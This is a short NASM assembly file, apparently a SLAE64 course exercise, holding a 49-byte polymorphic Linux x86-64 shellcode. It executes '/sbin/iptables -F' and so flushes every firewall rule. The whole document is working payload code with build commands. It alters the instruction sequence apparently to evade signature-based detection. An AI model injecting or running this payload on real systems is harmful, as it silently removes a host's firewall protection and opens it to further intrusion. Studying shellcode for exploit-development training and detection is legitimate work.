; Author : SLAE64-PA-6470 (kahlon81)
; 
; nasm -f elf64 shellcode-683-polymorphic2.nasm -o shellcode-683-polymorphic2.o
; ld shellcode-683-polymorphic2.o -o shellcode-683-polymorphic2
;
; Title: Linux/x86-64 - execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL) - 49 bytes
     
     
; Source Code (NASM):
     
section .text

global _start
         
    _start:
;   xor     rax, rax
	mov rbx, rax
	sub rax, rbx 
        
    push    rax

    push    word 0x462d
    mov     rcx, rsp
         
    mov     rbx, 0x73656c626174ffff
    shr     rbx, 0x10

;   push    rbx
	mov qword [rsp - 8], rbx
    sub rsp, 8
        
	mov     rbx, 0x70692f6e6962732f
    push    rbx

    mov     rdi, rsp
         
    push    rax
	push    rcx
    push    rdi

    mov     rsi, rsp
         
    ; execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL);
    mov     al, 0x3b
    syscall